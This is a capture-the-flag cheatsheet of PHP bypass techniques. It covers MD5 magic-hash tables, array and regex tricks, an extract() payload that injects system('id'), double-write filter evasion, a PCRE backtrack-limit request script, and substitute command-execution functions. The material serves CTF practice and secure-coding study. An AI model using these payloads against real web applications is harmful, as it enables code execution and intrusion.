# PHP Bypass Techniques Cheatsheet

## PHP Weak Comparison Bypass ($a == md5($a))

In PHP weak-type comparison, strings starting with `0e` are treated as scientific notation and equal `0`.

**⚠️ Key condition: digits only (0-9) after `0e` — no letters!**
- ✅ `0e830400451993494058024219903391` → all digits, PHP treats as `0 × 10^830...` = `0`
- ❌ `0e993dffb88165eb32369e16dd25b536` → contains letters `d`/`f`, PHP does NOT treat as scientific notation; string comparison applies

| Value | MD5 Result | Digits only after 0e? | Notes |
|-------|-----------|----------------------|-------|
| QNKCDZO | 0e830400451993494058024219903391 | ✅ | 0e prefix, PHP `==` treats as 0 |
| 240610708 | 0e462097431906509019562988736854 | ✅ | same |
| s878926199a | 0e545993274517709034328855841020 | ✅ | same |
| s155964671a | 0e342768416822451524974117254469 | ✅ | same |
| s214587387a | 0e848204310308006290363795692068 | ✅ | same |
| s1091221200a | 0e940625744785414655937625828514 | ✅ | same |
| 0e215962017 | 0e291242476940776845150308577824 | ✅ | same |

**⚠️ Don't brute-force MD5 collisions yourself** — use values from the table above; they are all pre-verified.

## PHP Weak Comparison Bypass ($a != $b && md5($a) == md5($b))

**⚠️ Key condition: digits only (0-9) after `0e` — no letters!**

| Value A | Value B | MD5(A) | MD5(B) | Digits only after 0e? |
|---------|---------|--------|--------|----------------------|
| QNKCDZO | 240610708 | 0e830400... | 0e462097... | ✅ both work |
| s878926199a | s155964671a | 0e545993... | 0e342768... | ✅ both work |
| QNKCDZO | s878926199a | 0e830400... | 0e545993... | ✅ both work |

**⚠️ Brute-forced MD5 values usually don't work** — `0e993dffb...` contains letters d/f; PHP doesn't treat it as scientific notation, so weak comparison fails. Use pre-verified values from the table.

## PHP Strict Comparison Bypass ($a !== $b && md5($a) === md5($b))

`md5()` cannot handle arrays; passing an array returns `NULL`, and `NULL === NULL` is `true`:
```
?a[]=1&b[]=2
md5($_GET['a']) === md5($_GET['b'])  // NULL === NULL → true
```

## Array Bypass

`preg_match()` can only process strings; passing an array returns `false`:
```
?p[]=nss2&p[]=ctf
// preg_match("/n|c/", $_GET['p']) → false (no match, bypassed)
```

`call_user_func` accepts arrays as callbacks:
```php
call_user_func(array('ClassName', 'methodName'))  // equivalent to ClassName::methodName()
call_user_func(['nss2', 'ctf'])                   // equivalent to nss2::ctf()
```

## extract() Variable Overwrite

`extract($_GET)` overwrites existing variables with GET parameters:
```
?_GET[cmd]=system('id')
```

## intval() Bypass

```php
if (intval($_GET['num']) === 0) { ... }
// Bypass methods:
?num=0x10     // hexadecimal, intval doesn't parse by default
?num=+0       // positive prefix
?num=0e123    // scientific notation
?num[]=1      // array, intval returns 1
```

## PHP Regex Bypass

| Scenario | Method | Example |
|----------|--------|---------|
| Regex without `i` modifier | Case bypass | `Nss2::Ctf` bypasses `/n\|c/m` |
| preg_match only checks strings | Array bypass | `p[]=xxx` makes preg_match return false |
| `^$` + `m` modifier | Newline bypass | `aaa%0abbb` bypasses `/^aaa$/m` |
| `.` doesn't match newline | `%0a` bypass | Insert newline character |
| Backtrack limit | Super-long string | Craft a very long string to make preg_match return false (PCRE backtrack limit default 1 million) |

### ⭐ preg_replace Double-Write Bypass (High-Frequency Exam Topic)

**Scenario**: `preg_replace('/keyword/', '', $input)` where the replaced result must **equal the keyword itself**

**Core principle**: Embed the complete keyword inside itself; after removing the inner copy, the outer pieces concatenate to form the original word

**Universal construction**: `keyword_first_half + keyword + keyword_second_half`

| Filtered keyword | Double-write input | Replacement process | Result |
|-----------------|--------------------|---------------------|--------|
| NSSCTF | `NSSNSSCTFCTF` | remove inner NSSCTF → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | remove inner flag → fl+ag | `flag` ✅ |
| cat | `cacatt` | remove inner cat → ca+t | `cat` ✅ |
| system | `syssystemtem` | remove inner system → sys+tem | `system` ✅ |
| hack | `hahackck` | remove inner hack → ha+ck | `hack` ✅ |

**⚠️ Why case bypass doesn't work**:
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` doesn't match `NSS` → returned unchanged as `NssCTF`
- `NssCTF !== "NSSCTF"` → strict comparison fails → rejected
- Double-write bypass is the only method that makes the replaced result **exactly equal to the original string**

**Identification signals**:
- Source contains `preg_replace('/X/', '', $str)` and `$str === "X"` → double-write bypass
- Source contains `str_replace('X', '', $str)` and `$str === "X"` → same double-write bypass applies

### PCRE Backtrack Limit Bypass

```python
import requests
url = "http://target/index.php"
# Craft super-long string to exhaust preg_match backtrack limit and return false
payload = "a" * 1000000 + "evil_content"
data = {"input": payload}
r = requests.post(url, data=data)
print(r.text)
```

## PHP Function/Feature Bypass Quick Reference

| Scenario | Method | Example |
|----------|--------|---------|
| Regex without `i` | Case bypass | `Nss2::Ctf` bypasses `/n\|c/m` |
| preg_match string restriction | Array bypass | `p[]=nss2&p[]=ctf` |
| call_user_func class method | Array callback | `call_user_func(['nss2','ctf'])` |
| Function name contains banned chars | Find alternative function | `readfile` doesn't contain n/c |
| extract variable overwrite | Overwrite key variables | Modify auth/permission-related variables |
| is_numeric check | Hex/scientific notation | `0x10`, `1e1` |
| strcmp comparison | Array bypass | `pass[]=1` makes strcmp return NULL |
| in_array weak type | Type deception | `"0admin"` passes `in_array(0, ['admin'])` |

## PHP Code Execution Alternative Functions

When `system` / `exec` are banned:

| Function | Usage | Output |
|----------|-------|--------|
| `system($cmd)` | Execute directly | Has output (to stdout) |
| `exec($cmd, $output)` | Execute and store in array | No direct output; need `print_r($output)` |
| `passthru($cmd)` | Execute and output raw data | Has output |
| `shell_exec($cmd)` | Returns string | No output; need `echo` |
| Backtick `` `$cmd` `` | Equivalent to shell_exec | No output; need `echo` |
| `popen($cmd, 'r')` | Open process pipe | Need `fread` to read |
| `proc_open()` | More flexible process control | Need to read manually |
